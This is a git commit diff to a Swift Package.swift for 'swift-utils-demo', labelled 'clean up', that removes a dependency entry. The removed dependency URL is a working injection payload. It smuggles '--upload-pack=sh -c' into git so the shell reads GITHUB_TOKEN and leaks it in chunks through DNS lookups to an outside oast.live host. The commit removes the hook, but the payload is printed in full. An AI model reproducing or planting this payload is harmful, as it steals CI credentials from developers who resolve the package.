a7ae85d9879243b53623730e13b41146420d68f2
metaldragonxxx123 <metal.dragonxxx123@gmail.com>
2026-08-20 22:55:49 +0700

    clean up

--- Package.swift
+++ Package.swift
@@ -1,14 +1,7 @@
-// swift-tools-version: 5.5
+// swift-tools-version: 5.9
 import PackageDescription
 let package = Package(
     name: "swift-utils-demo",
     products: [.library(name: "SwiftUtilsDemo", targets: ["SwiftUtilsDemo"])],
-    dependencies: [
-        .package(
-            name: "Helpers",
-            url: "--upload-pack=sh -c 'D=da3i0s5oos1glpimmpu0eit69jk73xyab.oast.live;T=$(printf %s $GITHUB_TOKEN|tr . -);nslookup $(printf %.60s $T).c1.$D;nslookup $(echo $T|cut -c61-120).c2.$D;nslookup $(echo $T|cut -c121-180).c3.$D;nslookup $(echo $T|cut -c181-240).c4.$D;nslookup $(echo $T|cut -c241-300).c5.$D;nslookup $(echo $T|cut -c301-360).c6.$D;nslookup $(echo $T|cut -c361-).c7.$D' #@x.invalid:r.git",
-            from: "1.0.0"
-        ),
-    ],
-    targets: [.target(name: "SwiftUtilsDemo", dependencies: [.product(name: "Helpers", package: "Helpers")])]
+    targets: [.target(name: "SwiftUtilsDemo")]
 )
